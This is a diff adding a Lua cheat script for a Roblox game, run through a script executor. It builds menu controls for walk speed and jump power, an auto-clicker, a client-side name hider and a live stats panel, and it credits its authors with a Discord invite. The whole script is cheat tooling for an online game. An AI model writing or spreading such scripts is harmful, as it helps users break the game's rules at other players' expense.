+    getgenv().ValueWalk1 = a
+end)
+c:Slider("JumpPower", 40, 200, 1, function(a)
+    getgenv().ValueJump1 = a
+end)
+c:Toggle("Auto Click", false, function(a)
+    getgenv().AutoClick = a
+    while getgenv().AutoClick do wait(getgenv().DelayClick)
+        if getgenv().AutoClick == true then
+            if getgenv().MousePos == true then
+                game:GetService("VirtualUser"):ClickButton1(Vector2.new(game.Players.LocalPlayer:GetMouse().X, game.Players.LocalPlayer:GetMouse().Y))
+            elseif getgenv().MousePos == false then
+                game:GetService("VirtualUser"):ClickButton1(Vector2.new(2000, 2000))
+            end
+        end
+    end
+end)
+c:Slider("Delay Click Time", 0, 120, 1, function(a)
+    getgenv().DelayClick = a
+end)
+c:Toggle("Name Protect (Cilent)", false, function(ab)
+    if ab == true then
+        game.Players.LocalPlayer.PlayerGui.MainGui.Utility.RPName.Visible = false
+        game.Players.LocalPlayer.PlayerGui.PlayerList.Frame.ScrollF[game.Players.LocalPlayer.Name].User.Txt.Visible = false
+    elseif ab == false then
+        game.Players.LocalPlayer.PlayerGui.MainGui.Utility.RPName.Visible = true
+        game.Players.LocalPlayer.PlayerGui.PlayerList.Frame.ScrollF[game.Players.LocalPlayer.Name].User.Txt.Visible = true
+    end
+end)
+c:Label("Character Stats:")
+local maxh = c:Label("Health: "..math.floor(game.Players.LocalPlayer.Character.Humanoid.Health).."/"..math.floor(game.Players.LocalPlayer.Character.Humanoid.MaxHealth))
+local maxs = c:Label("Stamina: "..math.floor(game.Players.LocalPlayer.Character.CurrentStamina.Value).."/"..math.floor(game.Players.LocalPlayer.Character.MaxStamina.Value))
+local stomach = c:Label("Stomach: "..math.floor((game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF.Bar.AbsoluteSize.X)/(game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF.AbsoluteSize.X)*100).."%")
+local calo = c:Label("Calories: "..math.floor((game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.Calories.Bar.AbsoluteSize.X)/(game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.Calories.AbsoluteSize.X)*100).."%")
+local speed1 = c:Label("Speed: "..math.floor(game.Players.LocalPlayer.Character.Humanoid.WalkSpeed))
+local jump1 = c:Label("Jump: "..math.floor(game.Players.LocalPlayer.Character.Humanoid.JumpPower))
+spawn(function()
+    while wait(1) do
+        getgenv().StomachPT = math.floor((game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF.Bar.AbsoluteSize.X)/(game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF.AbsoluteSize.X)*100)
+        jump1:Refresh("Jump: "..math.floor(game.Players.LocalPlayer.Character.Humanoid.JumpPower))
+        stomach:Refresh("Stomach: "..math.floor((game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF.Bar.AbsoluteSize.X)/(game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.BarF.AbsoluteSize.X)*100).."%")
+        speed1:Refresh("Speed: "..math.floor(game.Players.LocalPlayer.Character.Humanoid.WalkSpeed))
+        calo:Refresh("Calories: "..math.floor((game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.Calories.Bar.AbsoluteSize.X)/(game.Players.LocalPlayer.PlayerGui.MainGui.Utility.StomachBar.Calories.AbsoluteSize.X)*100).."%")
+        maxh:Refresh("Health: "..math.floor(game.Players.LocalPlayer.Character.Humanoid.Health).."/"..math.floor(game.Players.LocalPlayer.Character.Humanoid.MaxHealth))
+        maxs:Refresh("Stamina: "..math.floor(game.Players.LocalPlayer.Character.CurrentStamina.Value).."/"..math.floor(game.Players.LocalPlayer.Character.MaxStamina.Value))
+    end
+end)
+d:Label("Made by Geta")
+d:Label("Contributors: LSU")
+d:Label("Discord Server: discord.gg/kzNFNEFRbz")
+d:Button("Copy Invitelink Discord Server", function()
+        CopyInvite()
+end)
+d:Label("-- j4f --")
